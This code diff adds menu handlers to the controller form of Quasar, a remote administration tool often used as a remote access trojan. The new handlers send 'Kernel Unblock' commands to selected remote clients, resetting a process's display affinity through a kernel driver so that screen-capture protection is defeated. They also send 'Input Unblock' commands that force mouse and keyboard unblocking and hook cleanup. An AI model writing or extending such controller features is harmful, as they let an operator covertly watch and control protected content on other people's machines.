@@ -1,6 +1,8 @@
 ﻿using Quasar.Common.Enums;
 using Quasar.Common.Messages;
+using Quasar.Server.Controls;
 using Quasar.Server.Extensions;
+using Quasar.Server.Helper;
 using Quasar.Server.Messages;
 using Quasar.Server.Models;
 using Quasar.Server.Networking;
@@ -22,6 +24,7 @@ namespace Quasar.Server.Forms
 
         private const int STATUS_ID = 4;
         private const int USERSTATUS_ID = 5;
+        private const string KernelUnblockCustomTag = "__kernel_unblock_custom__";
 
         private bool _titleUpdateRunning;
         private bool _processingClientConnections;
@@ -645,6 +648,77 @@ namespace Quasar.Server.Forms
                 var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
                 frmRd.Show();
                 frmRd.Focus();
+            }
+        }
+
+        private void kernelUnblockToolStripMenuItem_DropDownOpening(object sender, EventArgs e)
+        {
+            kernelUnblockToolStripMenuItem.DropDownItems.Clear();
+
+            foreach (string processName in KernelUnblockPresets.ProcessNames)
+            {
+                var item = new ToolStripMenuItem(processName) { Tag = processName };
+                kernelUnblockToolStripMenuItem.DropDownItems.Add(item);
+            }
+
+            if (kernelUnblockToolStripMenuItem.DropDownItems.Count > 0)
+                kernelUnblockToolStripMenuItem.DropDownItems.Add(new ToolStripSeparator());
+
+            var customItem = new ToolStripMenuItem("Custom...") {Tag = KernelUnblockCustomTag};
+            kernelUnblockToolStripMenuItem.DropDownItems.Add(customItem);
+        }
+
+        private void kernelUnblockToolStripMenuItem_DropDownItemClicked(object sender, ToolStripItemClickedEventArgs e)
+        {
+            var processTag = e.ClickedItem.Tag as string;
+            if (string.IsNullOrEmpty(processTag))
+                return;
+
+            string processName = processTag;
+            if (processTag == KernelUnblockCustomTag)
+            {
+                processName = "explorer";
+                if (InputBox.Show("Kernel Unblock", "Enter the process name to reset display affinity:", ref processName) != DialogResult.OK)
+                    return;
+
+                processName = processName?.Trim();
+                if (string.IsNullOrEmpty(processName))
+                    return;
+            }
+
+            Client[] clients = GetSelectedClients();
+            if (clients.Length == 0)
+                return;
+
+            foreach (Client client in clients)
+            {
+                client.Send(new DoKernelUnblock
+                {
+                    ProcessName = processName,
+                    IncludeChildProcesses = true,
+                    RequireDriver = true,
+                    ForceResetAffinity = false,
+                    DriverAction = KernelDriverAction.EnsureRunning,
+                    Force = false
+                });
+            }
+        }
+
+        private void inputUnblockToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            Client[] clients = GetSelectedClients();
+            if (clients.Length == 0)
+                return;
+
+            foreach (Client client in clients)
+            {
+                client.Send(new DoInputUnblock
+                {
+                    UnblockMouse = true,
+                    UnblockKeyboard = true,
+                    ForceBlockInputReset = true,
+                    ForceHookCleanup = true
+                });
             }
         }
 
